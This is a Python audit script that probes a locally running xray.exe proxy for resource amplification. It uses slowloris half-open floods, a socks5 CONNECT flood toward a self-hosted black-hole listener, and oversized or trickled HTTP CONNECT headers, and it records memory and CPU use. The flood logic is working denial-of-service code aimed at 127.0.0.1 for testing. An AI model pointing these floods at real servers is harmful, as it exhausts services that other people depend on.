"""Resource-amplification probes against a live xray.exe (round2 audit).

Measures RSS + CPU of the xray process around three attack shapes:
  A) half-open slowloris flood (1 byte then idle), per inbound
  B) unauthenticated socks CONNECT flood toward a black-hole target
  C) oversized HTTP head (1 MiB) cost per connection

Usage: python probe_amplify.py <scenario> [n]
"""
import socket
import subprocess
import sys
import threading
import time

HOST = "127.0.0.1"


def stats():
    ps = (
        "Get-Process xray -ErrorAction SilentlyContinue | "
        "Measure-Object WorkingSet64,CPU,@{n='T';e={$_.Threads.Count}} | "
        "ForEach-Object { \"$($_.Count) $($_.Sum)\" }"
    )
    try:
        out = subprocess.run(["powershell", "-NoProfile", "-Command", ps],
                             capture_output=True, text=True, timeout=30).stdout.strip()
        parts = out.split()
        if len(parts) >= 2:
            return int(parts[1]) // (1024 * 1024), float(parts[0])
    except Exception:
        pass
    return -1, -1.0


def rss_mb():
    ps = "Get-Process xray -ErrorAction SilentlyContinue | ForEach-Object { $_.WorkingSet64 }"
    out = subprocess.run(["powershell", "-NoProfile", "-Command", ps],
                         capture_output=True, text=True, timeout=30).stdout.strip()
    tot = 0
    for line in out.splitlines():
        line = line.strip()
        if line.isdigit():
            tot += int(line)
    return tot // (1024 * 1024)


def cpu_s():
    ps = "Get-Process xray -ErrorAction SilentlyContinue | ForEach-Object { $_.CPU }"
    out = subprocess.run(["powershell", "-NoProfile", "-Command", ps],
                         capture_output=True, text=True, timeout=30).stdout.strip()
    tot = 0.0
    for line in out.splitlines():
        line = line.strip().replace(",", ".")
        try:
            tot += float(line)
        except ValueError:
            pass
    return tot


def hold_slow(port, n, payloads, hold_s=20):
    """Open n sockets, send payload bytes, keep them open."""
    socks = []
    for i in range(n):
        try:
            s = socket.create_connection((HOST, port), timeout=2)
            s.sendall(payloads[i % len(payloads)])
            s.setblocking(False)
            socks.append(s)
        except OSError:
            break
    return socks


def main():
    scenario = sys.argv[1]
    n = int(sys.argv[2]) if len(sys.argv) > 2 else 200
    base = rss_mb()
    cpu0 = cpu_s()
    print(f"[{scenario}] baseline rss={base} MB cpu={cpu0:.2f}s")

    if scenario == "slow-vless":
        socks = hold_slow(19103, n, [b"\x00"], hold_s=25)
        time.sleep(3)
        mid = rss_mb()
        print(f"  held {len(socks)} slow vless conns -> rss={mid} MB "
              f"(+{mid - base} MB, {(mid - base) * 1024 / max(1, len(socks)):.1f} KB/conn)")
        closed = 0
        for s in socks:
            try:
                d = s.recv(1)
                if d == b"":
                    closed += 1
            except BlockingIOError:
                pass
            except OSError:
                closed += 1
        print(f"  after 3s: {closed}/{len(socks)} already closed by server (expect 0, handshake timeout is 60s)")
        time.sleep(20)
        cpu1 = cpu_s()
        still = 0
        for s in socks:
            try:
                d = s.recv(1)
                if d == b"":
                    pass
                else:
                    still += 1
            except BlockingIOError:
                still += 1
            except OSError:
                pass
        print(f"  after 23s: {still}/{len(socks)} still open; cpu delta={cpu1 - cpu0:.2f}s")
        for s in socks:
            s.close()
        time.sleep(1.5)
        print(f"  after close all: rss={rss_mb()} MB")

    elif scenario == "slow-socks":
        # socks: half-open before greeting completes
        socks = hold_slow(19101, n, [b"\x05"], hold_s=20)
        time.sleep(2)
        mid = rss_mb()
        print(f"  held {len(socks)} half-open socks conns -> rss={mid} MB "
              f"(+{mid - base} MB, {(mid - base) * 1024 / max(1, len(socks)):.1f} KB/conn)")
        for s in socks:
            s.close()
        time.sleep(1.5)
        print(f"  after close all: rss={rss_mb()} MB")

    elif scenario == "socks-connect":
        # complete socks5 CONNECT toward a black-hole listener we own
        bh = socket.socket()
        bh.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        bh.bind((HOST, 19999))
        bh.listen(512)
        accepted = []
        stop = threading.Event()

        def drain():
            bh.settimeout(0.5)
            while not stop.is_set():
                try:
                    c, _ = bh.accept()
                    accepted.append(c)
                except OSError:
                    pass

        threading.Thread(target=drain, daemon=True).start()
        socks = []
        for _ in range(n):
            try:
                s = socket.create_connection((HOST, 19101), timeout=2)
                s.sendall(b"\x05\x01\x00")
                s.recv(2)
                s.sendall(b"\x05\x01\x00\x01" + socket.inet_aton(HOST) + (19999).to_bytes(2, "big"))
                s.settimeout(2)
                try:
                    s.recv(10)
                except OSError:
                    pass
                socks.append(s)
            except OSError:
                break
        time.sleep(2)
        mid = rss_mb()
        print(f"  {len(socks)} socks CONNECTs open (accepted by blackhole={len(accepted)}) -> rss={mid} MB "
              f"(+{mid - base} MB, {(mid - base) * 1024 / max(1, len(socks)):.1f} KB/conn)")
        for s in socks:
            s.close()
        stop.set()
        for c in accepted:
            c.close()
        bh.close()
        time.sleep(1.5)
        print(f"  after close all: rss={rss_mb()} MB")

    elif scenario == "http-head":
        size = n  # header bytes
        cpu_before = cpu_s()
        t0 = time.time()
        s = socket.create_connection((HOST, 19102), timeout=5)
        # one CONNECT line with a huge host -> single line > budget
        s.sendall(b"CONNECT " + b"a" * size + b":443 HTTP/1.1\r\n\r\n")
        s.settimeout(5)
        try:
            got = s.recv(4096)
        except OSError as e:
            got = f"<{e}>".encode()
        s.close()
        dt = time.time() - t0
        cpu_after = cpu_s()
        print(f"  http head {size} bytes: reply={got[:80]!r} wall={dt:.2f}s "
              f"cpu_delta={cpu_after - cpu_before:.2f}s rss={rss_mb()} MB")

    elif scenario == "http-head-trickle":
        size = n
        s = socket.create_connection((HOST, 19102), timeout=5)
        cpu_before = cpu_s()
        t0 = time.time()
        s.sendall(b"CONNECT ")
        blk = b"a" * 512
        sent = 7
        while sent < size:
            s.sendall(blk)
            sent += len(blk)
        cpu_after = cpu_s()
        print(f"  http trickle {sent} bytes in 512B writes: wall={time.time() - t0:.2f}s "
              f"cpu_delta={cpu_after - cpu_before:.2f}s")
        s.close()

    print(f"[{scenario}] final rss={rss_mb()} MB")


if __name__ == "__main__":
    main()
